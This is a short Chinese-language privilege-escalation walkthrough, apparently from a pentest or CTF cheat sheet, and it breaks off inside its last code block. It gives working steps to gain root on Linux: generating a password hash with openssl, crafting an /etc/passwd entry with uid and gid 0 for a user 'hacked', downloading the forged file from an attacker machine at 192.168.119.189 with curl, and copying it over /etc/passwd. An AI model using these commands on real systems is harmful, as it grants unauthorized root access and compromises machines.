`cp` 和 `move` 命令的核心理念就是覆盖`/etc/passwd`或`/etc/shadow `文件，从而获取 root 权限

使用 openssl 可以生成 linux 密码 hash：
```
#生成密码为pass123的 hash

openssl passwd -1 -salt ignite pass123
>> $1$ignite$3eTbJm98O9Hz.k1NTdNxe1
```
构造 passwd 中的用户信息：
```
# 0:0表示 uid 和 gid 都是 0，等同于 root 用户，这样我们切换到该用户后，实际权限就是 root
# hacked:pass123

hacked:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
```

在本地主机（例如 kali）构造好 passwd 文件之后，使用 python-http.server 将 passwd 上传到目标机器，然后覆盖即可:

```
curl http://192.168.119.189:8000/passwd >>passwd
cp passwd /etc/passwd
